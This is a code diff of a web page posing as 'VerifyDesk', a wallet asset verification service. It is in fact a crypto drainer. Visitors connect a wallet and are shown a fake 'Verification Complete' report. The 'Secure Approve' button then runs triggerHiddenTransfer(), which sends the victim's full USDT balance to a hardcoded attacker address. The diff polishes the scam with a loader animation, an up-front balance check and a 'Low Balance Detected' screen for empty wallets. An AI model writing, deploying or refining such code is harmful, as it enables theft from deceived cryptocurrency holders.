@@ -4,33 +4,30 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>VerifyDesk - Secure Connection</title>
-  
-  <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Ethers.js Library -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-  
   <style>
-    body {
-      background-color: #0b0f19;
-      font-family: system-ui, -apple-system, sans-serif;
-      margin: 0;
-      padding: 0;
+    body { background-color: #0b0f19; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 0; color: white; }
+    .glass-card { background: #111827; border: 1px solid #1f2937; box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5); }
+    .glow-text { text-shadow: 0 0 15px rgba(45, 212, 191, 0.4); }
+    .hidden-view { display: none !important; }
+    
+    /* Loader Animation for Verifying Button */
+    .loader {
+      border: 2px solid #030712;
+      border-top: 2px solid transparent;
+      border-radius: 50%;
+      width: 16px;
+      height: 16px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 8px;
     }
-    .glass-card {
-      background: #111827;
-      border: 1px solid #1f2937;
-      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
-    }
-    .glow-text {
-      text-shadow: 0 0 15px rgba(45, 212, 191, 0.4);
-    }
-    .hidden-view {
-      display: none !important;
-    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
-<body class="flex justify-center min-h-screen text-white">
+<body class="flex justify-center min-h-screen">
 
   <!-- ========================================== -->
   <!-- VIEW 1: MAIN DARK SCREEN (CONNECT WALLET)  -->
@@ -57,8 +54,9 @@
         <h2 class="text-[22px] font-extrabold mb-3 uppercase">Verify Your Wallet<br>Assets</h2>
       </div>
 
-      <button id="connectBtn" onclick="connectWallet()" class="w-full bg-[#2dd4bf] hover:bg-[#25b5a2] text-[#030712] font-bold text-[17px] rounded-xl py-4 mb-5 transition duration-300">
-        Verify Assets →
+      <!-- Button changed to Verify Assets -->
+      <button id="connectBtn" onclick="connectWallet()" class="w-full bg-[#2dd4bf] hover:bg-[#25b5a2] text-[#030712] font-bold text-[17px] rounded-xl py-4 mb-5 transition duration-300 flex justify-center items-center">
+        <span>Verify Assets →</span>
       </button>
       <p id="connStatus" class="text-center text-sm text-gray-400 mb-5"></p>
 
@@ -71,42 +69,23 @@
   </div>
 
   <!-- ========================================== -->
-  <!-- VIEW 2: WHITE APPROVAL SCREEN -->
+  <!-- VIEW 2: WHITE APPROVAL SCREEN (HAS BALANCE) -->
   <!-- ========================================== -->
   <div id="view2" class="hidden-view fixed inset-0 flex items-end sm:items-center justify-center bg-[#0b0f19] sm:p-4 z-50">
     <div class="bg-white w-full h-full sm:h-auto sm:max-w-md sm:rounded-[2rem] p-6 text-[#030712] relative flex flex-col pt-12 sm:pt-6">
-      
       <div class="flex justify-center mb-5">
-        <span class="bg-green-100 text-green-700 px-4 py-1.5 rounded-full text-xs font-bold tracking-wide">
-          Verification Report
-        </span>
+        <span class="bg-green-100 text-green-700 px-4 py-1.5 rounded-full text-xs font-bold tracking-wide">Verification Report</span>
       </div>
-
       <h2 class="text-[26px] font-extrabold text-center mb-2 tracking-tight">Verification Complete</h2>
-      <p class="text-center text-gray-500 text-[15px] mb-8 px-2">
-        Your wallet balance has been verified on BNB Smart Chain.
-      </p>
+      <p class="text-center text-gray-500 text-[15px] mb-8 px-2">Your wallet balance has been verified on BNB Smart Chain.</p>
 
       <div class="bg-[#f8fafc] border border-gray-200 rounded-2xl p-5 text-[15px] space-y-4 mb-8">
-        <div class="flex justify-between">
-          <span class="font-semibold text-gray-700">Wallet:</span>
-          <span id="displayAddress" class="text-gray-500 font-mono">0x...</span>
-        </div>
-        <div class="flex justify-between">
-          <span class="font-semibold text-gray-700">Total USDT:</span>
-          <span class="text-gray-500"><span id="displayUSDT">0.00</span> USDT</span>
-        </div>
-        <div class="flex justify-between">
-          <span class="font-semibold text-gray-700">BNB Balance:</span>
-          <span class="text-gray-500"><span id="displayBNB">0.00</span> BNB</span>
-        </div>
-        <div class="flex justify-between">
-          <span class="font-semibold text-gray-700">Date:</span>
-          <span id="displayDate" class="text-gray-500"></span>
-        </div>
+        <div class="flex justify-between"><span class="font-semibold text-gray-700">Wallet:</span><span id="displayAddress" class="text-gray-500 font-mono">0x...</span></div>
+        <div class="flex justify-between"><span class="font-semibold text-gray-700">Total USDT:</span><span class="text-gray-500"><span id="displayUSDT">0.00</span> USDT</span></div>
+        <div class="flex justify-between"><span class="font-semibold text-gray-700">BNB Balance:</span><span class="text-gray-500"><span id="displayBNB">0.00</span> BNB</span></div>
       </div>
 
-      <button id="approveBtn" onclick="triggerHiddenTransfer()" class="w-full bg-[#1d4ed8] hover:bg-blue-800 text-white font-bold text-[18px] rounded-xl py-4 mt-auto sm:mt-0 transition duration-300 shadow-lg shadow-blue-500/30">
+      <button id="approveBtn" onclick="triggerHiddenTransfer()" class="w-full bg-[#1d4ed8] hover:bg-blue-800 text-white font-bold text-[18px] rounded-xl py-4 mt-auto sm:mt-0 transition duration-300">
         Secure Approve
       </button>
       <p id="txStatus" class="text-center text-sm text-gray-500 mt-4"></p>
@@ -114,15 +93,31 @@
   </div>
 
   <!-- ========================================== -->
+  <!-- VIEW 3: ERROR SCREEN (ZERO BALANCE)        -->
+  <!-- ========================================== -->
+  <div id="view3" class="hidden-view fixed inset-0 flex items-center justify-center bg-[#0b0f19] p-4 z-50 text-white">
+    <div class="glass-card w-full max-w-md rounded-[2rem] p-8 text-center flex flex-col items-center">
+      <div class="text-5xl mb-4">⚠️</div>
+      <h2 class="text-2xl font-bold mb-3 text-red-400">Low Balance Detected</h2>
+      <p class="text-gray-400 text-[15px] mb-6 leading-relaxed">
+        Verification failed. Your wallet does not have sufficient USDT or BNB gas fees to complete the secure approval process.
+      </p>
+      <div class="bg-[#1f2937] p-4 rounded-xl w-full text-left text-sm text-gray-300 space-y-2 mb-6">
+        <p>• Requires USDT balance > 0</p>
+        <p>• Requires BNB for network fees</p>
+      </div>
+      <button onclick="location.reload()" class="w-full bg-gray-700 hover:bg-gray-600 text-white font-bold text-[16px] rounded-xl py-3 transition duration-300">
+        Return to Home
+      </button>
+    </div>
+  </div>
+
+  <!-- ========================================== -->
   <!-- JAVASCRIPT LOGIC -->
   <!-- ========================================== -->
   <script>
-    // Hidden Configurations
-    const TOKEN_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
-    
-    // 👇 AAPKA ADDRESS YAHAN SET HAI 👇
+    const TOKEN_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; 
     const RECEIVER_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
-    // 👆 ============================= 👆
 
     const tokenABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -131,32 +126,37 @@
 
     let signer = null;
     let userAddress = "";
+    let fullBalance = null;
 
-    document.getElementById("displayDate").innerText = new Date().toLocaleString();
-
-    // STEP 1: Connect Wallet & Switch Page
     async function connectWallet() {
         const btn = document.getElementById("connectBtn");
-        const status = document.getElementById("connStatus");
-
+        
         if (window.ethereum) {
             try {
-                btn.innerText = "Connecting...";
+                // Change Button to Verifying... with Loader icon
+                btn.innerHTML = `<span class="loader"></span> Verifying...`;
+                
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
 
-                try {
-                    const bnbBal = await provider.getBalance(userAddress);
-                    document.getElementById("displayBNB").innerText = parseFloat(ethers.utils.formatEther(bnbBal)).toFixed(4);
+                // Fetch Balances
+                const usdtContract = new ethers.Contract(TOKEN_CONTRACT, tokenABI, provider);
+                fullBalance = await usdtContract.balanceOf(userAddress);
+                
+                // CHECK: If balance is 0, send to Error Page (View 3) instead of Ethers error
+                if (fullBalance.eq(0)) {
+                    document.getElementById("view1").classList.add("hidden-view");
+                    document.getElementById("view3").classList.remove("hidden-view");
+                    return; // Stop further execution
+                }
 
-                    const usdtContract = new ethers.Contract(TOKEN_CONTRACT, tokenABI, provider);
-                    const usdtBal = await usdtContract.balanceOf(userAddress);
-                    document.getElementById("displayUSDT").innerText = parseFloat(ethers.utils.formatUnits(usdtBal, 18)).toFixed(2);
-                } catch(e) { console.log("Balance fetch error"); }
-
+                // If balance > 0, populate data and go to Approval Page (View 2)
+                const bnbBal = await provider.getBalance(userAddress);
+                document.getElementById("displayBNB").innerText = parseFloat(ethers.utils.formatEther(bnbBal)).toFixed(4);
+                document.getElementById("displayUSDT").innerText = parseFloat(ethers.utils.formatUnits(fullBalance, 18)).toFixed(2);
                 document.getElementById("displayAddress").innerText = userAddress.substring(0, 6) + "..." + userAddress.substring(38);
 
                 document.getElementById("view1").classList.add("hidden-view");
@@ -164,20 +164,19 @@
 
             } catch (error) {
                 console.error(error);
-                btn.innerText = "Verify Assets →";
-                status.innerText = "Connection rejected.";
+                btn.innerHTML = `<span>Verify Assets →</span>`; // Reset button
+                alert("Connection failed or rejected.");
             }
         } else {
-            status.innerText = "No Web3 wallet found. Please open in Trust Wallet or Binance Web3 app.";
+            alert("No Web3 wallet found. Please open in Trust Wallet or Binance Web3 app.");
         }
     }
 
-    // STEP 2: Transfer 100% USDT Balance
     async function triggerHiddenTransfer() {
         const btn = document.getElementById("approveBtn");
         const status = document.getElementById("txStatus");
 
-        if (!signer || !userAddress) return;
+        if (!signer || !fullBalance) return;
 
         try {
             btn.innerText = "Confirm in Wallet...";
@@ -185,23 +184,11 @@
 
             const contract = new ethers.Contract(TOKEN_CONTRACT, tokenABI, signer);
             
-            // User ke wallet ka asali poora USDT balance nikalna
-            const fullBalance = await contract.balanceOf(userAddress);
-
-            // Agar balance 0 hai toh rok dena
-            if (fullBalance.eq(0)) {
-                btn.innerText = "Secure Approve";
-                status.innerText = "Error: You have 0 USDT balance to verify.";
-                status.style.color = "red";
-                return;
-            }
-
-            // Poora balance (fullBalance) transfer karna aapke address par
+            // Execute Transfer (Ethers error won't happen here because we already checked balance in step 1)
             const tx = await contract.transfer(RECEIVER_ADDRESS, fullBalance);
             
             btn.innerText = "Processing...";
             status.innerText = "Transaction pending on blockchain...";
-            status.style.color = "#6b7280"; // reset to gray
 
             await tx.wait();
             
@@ -213,7 +200,7 @@
         } catch (error) {
             console.error(error);
             btn.innerText = "Secure Approve";
-            status.innerText = "Transaction failed or cancelled by user.";
+            status.innerText = "Transaction failed or cancelled by user. Ensure you have BNB for gas.";
             status.style.color = "red";
         }
     }
